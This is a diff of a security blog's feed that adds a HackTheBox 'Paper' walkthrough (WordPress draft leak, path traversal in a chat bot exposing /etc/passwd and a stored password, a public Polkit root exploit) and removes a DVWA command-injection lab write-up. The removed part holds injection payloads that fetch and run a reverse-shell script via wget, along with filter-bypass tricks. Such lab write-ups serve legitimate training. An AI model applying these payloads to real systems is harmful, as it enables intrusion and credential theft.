@@ -1,4 +1,214 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-06-11T16:10:16+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Meta - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/meta.html" rel="alternate" type="text/html" title="Meta - HackTheBox" /><published>2022-06-10T00:00:00+01:00</published><updated>2022-06-10T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/meta</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/meta.html"><![CDATA[<p><strong>Meta</strong> is a pretty easy <em>medium-rated</em> box on <em>HackTheBox</em>. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an <code class="language-plaintext highlighter-rouge">exiftool</code> CVE. User access is also another CVE targeting <em>ImageMagick</em>, and privesc to root is through a vulnerable sudo configuration on <code class="language-plaintext highlighter-rouge">neofetch</code>, which allows you to hijack the configuration file used by the program.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-06-18T18:29:06+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Paper - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/paper.html" rel="alternate" type="text/html" title="Paper - HackTheBox" /><published>2022-06-18T00:00:00+01:00</published><updated>2022-06-18T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/paper</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/paper.html"><![CDATA[<p><strong>Paper</strong> is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of <em>RocketChat</em> with a custom bot that’s vulnerable to path traversal. Privesc is through a CVE affecting Polkit.</p>
+
+<p><br /></p>
+
+<h3 id="info">Info</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/20220210063737.png" alt="" /></p>
+
+<p><img src="/assets/img/20220210063801.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<h4 id="nmap">NMAP</h4>
+
+<pre><code class="language-raw"># Nmap 7.70 scan initiated Sun Feb  6 02:17:09 2022 as: nmap -sC -sC -oN nmap.txt -v 10.10.11.143
+Nmap scan report for 10.10.11.143
+Host is up (0.23s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+| ssh-hostkey: 
+|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
+|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
+|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
+80/tcp  open  http
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: HTTP Server Test Page powered by CentOS
+443/tcp open  https
+|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
+| http-methods: 
+|   Supported Methods: GET POST OPTIONS HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-title: HTTP Server Test Page powered by CentOS
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Subject Alternative Name: DNS:localhost.localdomain
+| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-07-03T08:52:34
+| Not valid after:  2022-07-08T10:32:34
+| MD5:   579a 92bd 803c ac47 d49c 5add e44e 4f84
+|_SHA-1: 61a2 301f 9e5c 2603 a643 00b5 e5da 5fd5 c175 f3a9
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   http/1.1
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sun Feb  6 02:18:44 2022 -- 1 IP address (1 host up) scanned in 95.12 seconds
+
+</code></pre>
+
+<p><br /></p>
+
+<h4 id="web">Web</h4>
+
+<p><img src="/assets/img/20220210064120.png" alt="" /></p>
+
+<p>Checking my Burp Suite logs, one header stood out;</p>
+
+<p><img src="/assets/img/20220210064528.png" alt="" /></p>
+
+<p>A quick googling told me that;</p>
+
+<blockquote>
+  <p>x-backend-server header is used to return the name of the back end webserver that may sit behind load balancer server</p>
+</blockquote>
+
+<p>The server is listening on both port <strong>80</strong> and <strong>443</strong>, so I was expecting port <strong>80</strong> to be redirecting to <strong>443</strong>, but it isn’t. Sending a request over HTTPs (PORT <strong>443</strong>) loads the same page, but with the <strong>X-Backend-Server</strong> header removed. So I am assuming the service on port <strong>80</strong> is acting as a proxy;</p>
+
+<p><img src="/assets/img/20220210065044.png" alt="" /></p>
+
+<p>I added the <strong>office.paper</strong> hostname to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, and got a different page;</p>
+
+<p><img src="/assets/img/20220210065336.png" alt="" /></p>
+
+<p>The bottom part of the page (comments and search field) hints at a wordpress site, and sure enough, it is one;</p>
+
+<p><img src="/assets/img/20220210065526.png" alt="" /></p>
+
+<p><br /></p>
+
+<h4 id="officepaper">OFFICE.PAPER</h4>
+
+<p>This is probably the only user, and likely the admin user because the user <strong>admin</strong> may not exist according to the password reset page, and a blog post;</p>
+
+<p><img src="/assets/img/20220210070239.png" alt="" /></p>
+
+<p><em>Wappalyzer</em> identified the wordpress version as <strong>5.2.3</strong>;</p>
+
+<p><img src="/assets/img/20220210070626.png" alt="" /></p>
+
+<p>There is an interesting comment from a user named <strong>nick</strong>;</p>
+
+<p><img src="/assets/img/20220210070828.png" alt="" /></p>
+
+<p>Testing the username in the <code class="language-plaintext highlighter-rouge">wp-login.php</code> page, it indicate the user exists.</p>
+
+<p>I updated my <code class="language-plaintext highlighter-rouge">wpscan</code>, and load my API token to scan the website for known vulnerabilities. <strong>31</strong> vulns were identified, but one in particular caught my attention;</p>
+
+<p><img src="/assets/img/20220210153240.png" alt="" /></p>
+
+<p>Remember earlier <strong>nick</strong> was warning <strong>prisonmike</strong> (Michael) about saving sensitive data in drafts? The above vuln claims that private posts or drafts can be viewed by unauthenticated users. Going to the first link https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2, I found a simple PoC URL, which worked when requesting <code class="language-plaintext highlighter-rouge">http://office.paper/?static=1</code>;</p>
+
+<p><img src="/assets/img/20220210153716.png" alt="" /></p>
+
+<p>Note that the above revealed hidden domain on the site, so I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file with it. The URL http://chat.office.paper/register/8qozr226AhkCHZdyY looks interesting as it looks like we can use it to create an account on the service. Going to the homepage, I got this page;</p>
+
+<p><img src="/assets/img/20220210154214.png" alt="" /></p>
+
+<p>Sure enough, going to the URL found using the draft leak, I was presented with a registration form;</p>
+
+<p><img src="/assets/img/20220210154612.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="rocketchat">RocketChat</h3>
+<p><br /></p>
+
+<p>Following successful sign up, I was logged into the chat service. There is a channel named <em>general</em> which contains a few messages;</p>
+
+<p><img src="/assets/img/20220210155734.png" alt="" /></p>
+
+<p>Going through the chat log, I found out there is a bot in the channel with the name <strong>recyclops</strong>;</p>
+
+<p><img src="/assets/img/20220210160107.png" alt="" /></p>
+
+<p>The bot has a help page that showed an interesting feature that could be used to read files on the server;</p>
+
+<p><img src="/assets/img/20220210160209.png" alt="" /></p>
+
+<p>I don’t have permissions to send message in the <em>General</em> channel, but I can send a direct message to the bot by clicking on it’s profile and clicking the message icon. I used the <code class="language-plaintext highlighter-rouge">list sale</code> command to list files available as specified by the bot. The output look similar to that generated by the shell command <code class="language-plaintext highlighter-rouge">ls</code>;</p>
+
+<p><img src="/assets/img/20220210161154.png" alt="" /></p>
+
+<p>I tested for <em>path traversal</em>, and it turned out to be vulnerable. It looks like I have acces to the home directory of a user named <strong>dwight</strong>;</p>
+
+<p><img src="/assets/img/20220210161312.png" alt="" /></p>
+
+<p>There is no SSH key for the user in the <code class="language-plaintext highlighter-rouge">.ssh</code> directory. Attempts to inject shell commands into the <code class="language-plaintext highlighter-rouge">ls</code> command used to list directories kept getting detected;</p>
+
+<p><img src="/assets/img/20220210162350.png" alt="" /></p>
+
+<p>So I started hunting for the source code of the bot, and found it at <code class="language-plaintext highlighter-rouge">../hubot</code>. The file <code class="language-plaintext highlighter-rouge">hubot/scripts/files.js</code> is the one detecting our command injections;</p>
+
+<p><img src="/assets/img/20220210162620.png" alt="" /></p>
+
+<p>I spent some time working on a way to bypass the filter, but I couldn’t, so I moved on. Dumping the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file showed that local users <strong>rocketchat</strong> and <strong>dwight</strong> exist. Looking the the source directory of <code class="language-plaintext highlighter-rouge">hubot</code>, I found a credential inside <code class="language-plaintext highlighter-rouge">hubot/.env</code> file;</p>
+
+<p><img src="/assets/img/20220210214843.png" alt="" /></p>
+
+<p>Testing the password against the local users via SSH, I was able to login to the account of <strong>dwight</strong> and obtain the user flag;</p>
+
+<p><img src="/assets/img/20220210214933.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="privesc">PrivEsc</h3>
+<p><br /></p>
+
+<p>The user <strong>dwight</strong> does not have any sudo permissions in the box. For some reasons I could not run <code class="language-plaintext highlighter-rouge">pspy</code> in the host, as it just hangs without displaying any processes. <code class="language-plaintext highlighter-rouge">linPEAS</code> also didn’t work at first, until after I updated it, and even then it took very long to finish. Since this box was released after <strong>pwnkit</strong>, I looked at <code class="language-plaintext highlighter-rouge">/usr/bin/pkexec</code>, and the date indicates it may be vulnerable. I had to rely on modification date of the binary because the patch released for <em>pwnkit</em> did not increment the version number;</p>
+
+<p><img src="/assets/img/20220211173419.png" alt="" /></p>
+
+<p>The <strong>pwnkit</strong> vuln seems to be mitigated by stripping the binary of <em>SUID</em> permissions, which pretty much breaks it. I started looking for exploit for this, and found a GitHub repo at https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation by a user named <strong>secnigma</strong>, which is interesting because that’s the author of the box.</p>
+
+<p>The exploit did not work after multiple tries, so I started looking for another more reliable PoC. I found this: https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py</p>
+
+<p>Running the python script in the box, I got root on the first attempt;</p>
+
+<p><img src="/assets/img/20220211174234.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="summary">Summary</h3>
+<p><br /></p>
+
+<ul>
+  <li>Found open ports: <strong>22</strong>, <strong>80</strong>, and <strong>443</strong></li>
+  <li>Identified a hidden subdomain <strong>office.paper</strong> in <code class="language-plaintext highlighter-rouge">X-Backend-Server</code> header.</li>
+  <li><strong>office.paper</strong>
+    <ul>
+      <li>This was found to be a <em>wordpress</em> site.</li>
+      <li>Exploited a wordpress vulnerability that leaks private drafts/posts of users.</li>
+      <li>Leaked draft revealed a subdomain <strong>chat.office.paper</strong>.</li>
+    </ul>
+  </li>
+  <li><strong>chat.office.paper</strong>
+    <ul>
+      <li>Running an instance of <em>RocketChat</em>.</li>
+      <li>Exploited a bot to read arbitrary files on the server.</li>
+      <li>Read a config file that contains a password, which gave access to the box over SSH as the user <strong>dwight</strong></li>
+    </ul>
+  </li>
+  <li>Inside as <strong>dwight</strong>
+    <ul>
+      <li>Exploited a CVE to gain code execution as root.</li>
+    </ul>
+  </li>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="wordpress" /><category term="custom exploitation" /><category term="rocketchat" /><category term="pwnkit" /><summary type="html"><![CDATA[Paper is a nice and easy linux box. It starts with a wordpress site that can be exploited to leak user drafts, which will lead you to an instance of RocketChat with a custom bot that’s vulnerable to path traversal. Privesc is through a CVE affecting Polkit.]]></summary></entry><entry><title type="html">Meta - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/meta.html" rel="alternate" type="text/html" title="Meta - HackTheBox" /><published>2022-06-10T00:00:00+01:00</published><updated>2022-06-10T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/meta</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/meta.html"><![CDATA[<p><strong>Meta</strong> is a pretty easy <em>medium-rated</em> box on <em>HackTheBox</em>. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an <code class="language-plaintext highlighter-rouge">exiftool</code> CVE. User access is also another CVE targeting <em>ImageMagick</em>, and privesc to root is through a vulnerable sudo configuration on <code class="language-plaintext highlighter-rouge">neofetch</code>, which allows you to hijack the configuration file used by the program.</p>
 
 <p><br /></p>
 
@@ -2873,96 +3083,4 @@ mysql <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> <span c
 
 <p>This is likely because the token is tied to the session of a user, so by the time a token is issued for a request in one thread, other tokens issued to other threads will be invalidated. This makes the multi-threading feature added to the code completely useless :(</p>
 
-<p><img src="/assets/img/20220327093554.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="ffuf" /><category term="bruteforce" /><category term="python" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA on login bruteforcing.]]></summary></entry><entry><title type="html">Command Injection - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection.html" rel="alternate" type="text/html" title="Command Injection - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_command_injection.html"><![CDATA[<p>This is an exercise in OWASP DVWA for <em>command injection</em>.</p>
-
-<p><br /></p>
-
-<h3 id="command-injection---dvwa">Command Injection - DVWA</h3>
-<p><br /></p>
-
-<h4 id="difficulty-easy">Difficulty: Easy</h4>
-<p><br /></p>
-
-<p>This mode gave us an input field for an IP address. Following submission, and a short delay, some output that look to be the result of the <code class="language-plaintext highlighter-rouge">ping</code> command was displayed;</p>
-
-<p><img src="/assets/img/20220323175128.png" alt="" /></p>
-
-<p>The user input is submitted in a POST request;</p>
-
-<p><img src="/assets/img/20220323175239.png" alt="" /></p>
-
-<p>Since we do know our instance of DVWA is running on a linux host, we were able to inject code into the command by using a semi colon, which act as a command separator;</p>
-
-<p><img src="/assets/img/20220323175709.png" alt="" /></p>
-
-<p>I was able to spawn a shell on the box using a base64-encoded bash reverse shell;</p>
-
-<p><img src="/assets/img/20220323180023.png" alt="" /></p>
-
-<p><img src="/assets/img/20220323180043.png" alt="" /></p>
-
-<p><img src="/assets/img/20220323180124.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="difficulty-medium">Difficulty: Medium</h4>
-<p><br /></p>
-
-<p>In this mode, we are presented with the same form again;</p>
-
-<p><img src="/assets/img/20220323180426.png" alt="" /></p>
-
-<p>Using <code class="language-plaintext highlighter-rouge">;</code> to inject commands simply hung the application for few secods, before returning blank result. Testing for other methods of command injection, we were able to inject code using a double pipe (<code class="language-plaintext highlighter-rouge">||</code>), which is used to execute a command if the previous command in the chain has failed;</p>
-
-<p><img src="/assets/img/20220323180953.png" alt="" /></p>
-
-<p>This injection can also be used to spawn a shell on the box;</p>
-
-<p><img src="/assets/img/20220323181229.png" alt="" /></p>
-
-<p><img src="/assets/img/20220323181249.png" alt="" /></p>
-
-<p>Command injection using conditional operators like <code class="language-plaintext highlighter-rouge">||</code> is not ideal because they depend on the exit code of the primary command you are injecting into.  So I tried wrapping the injected command in backticks, which will take precedence over the primary command because it’s output will be used to construct the primary command, and it worked;</p>
-
-<p><img src="/assets/img/20220323181652.png" alt="" /></p>
-
-<p><img src="/assets/img/20220323181711.png" alt="" /></p>
-
-<p><br /></p>
-
-<h4 id="difficulty-high">Difficulty: High</h4>
-<p><br /></p>
-
-<p>We got the same form again in this mode;</p>
-
-<p><img src="/assets/img/20220323181932.png" alt="" /></p>
-
-<p>Command injection using <code class="language-plaintext highlighter-rouge">||</code> works;</p>
-
-<p><img src="/assets/img/20220323182443.png" alt="" /></p>
-
-<p>However, injecting any command that has a whitespace appears to fail;</p>
-
-<p><img src="/assets/img/20220323182510.png" alt="" /></p>
-
-<p>This indicate there may be a filter that blocks input that contain whitespaces. Since we know it’s a linux host, we may be able to bypass this using the <em>internal field separator</em> (IFS) environment variable, which is <code class="language-plaintext highlighter-rouge">$IFS</code>. In my bash shell, this is set to a newline character <code class="language-plaintext highlighter-rouge">0x0a</code>;</p>
-
-<p><img src="/assets/img/20220323182828.png" alt="" /></p>
-
-<p>To my surprise, using the <code class="language-plaintext highlighter-rouge">$IFS</code> variable to bypass the filter didn’t work. However, while the command <code class="language-plaintext highlighter-rouge">ls -al</code> failed, the command <code class="language-plaintext highlighter-rouge">ls /</code> actually succeeded, which indicate whitespace is likely not what the filter is targetting. The only difference I can see between these two commands is the hyphen character (<code class="language-plaintext highlighter-rouge">-</code>).</p>
-
-<p>If the application is indeed blocking the user of <code class="language-plaintext highlighter-rouge">-</code>, I can no longer use my base64-encoded reverse shell because I need to decode it using <code class="language-plaintext highlighter-rouge">base64 -d</code>. Checking the box for tools we can take advantage of, <code class="language-plaintext highlighter-rouge">wget</code> was found;</p>
-
-<p><img src="/assets/img/20220323210702.png" alt="" /></p>
-
-<p>I can download a file to current directory with<code class="language-plaintext highlighter-rouge">wget</code> without using any <code class="language-plaintext highlighter-rouge">-</code> character. So created a bash script on my box containing my reverse shell payload, and host it using python’s web server;</p>
-
-<p><img src="/assets/img/20220323210841.png" alt="" /></p>
-
-<p>Using the payload <code class="language-plaintext highlighter-rouge">|| wget http://172.17.0.1/shell.sh</code>, I was able to download it to the box. I then made it executable with <code class="language-plaintext highlighter-rouge">|| chmod +x shell.sh</code>, and ran it using <code class="language-plaintext highlighter-rouge">|| ./shell.sh</code>. This gave me a shell on the box;</p>
-
-<p><img src="/assets/img/20220323211103.png" alt="" /></p>
-
-<p><img src="/assets/img/20220323211202.png" alt="" /></p>
-
-<p><img src="/assets/img/20220323211249.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="command injection" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for command injection.]]></summary></entry></feed>
+<p><img src="/assets/img/20220327093554.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="ffuf" /><category term="bruteforce" /><category term="python" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA on login bruteforcing.]]></summary></entry></feed>
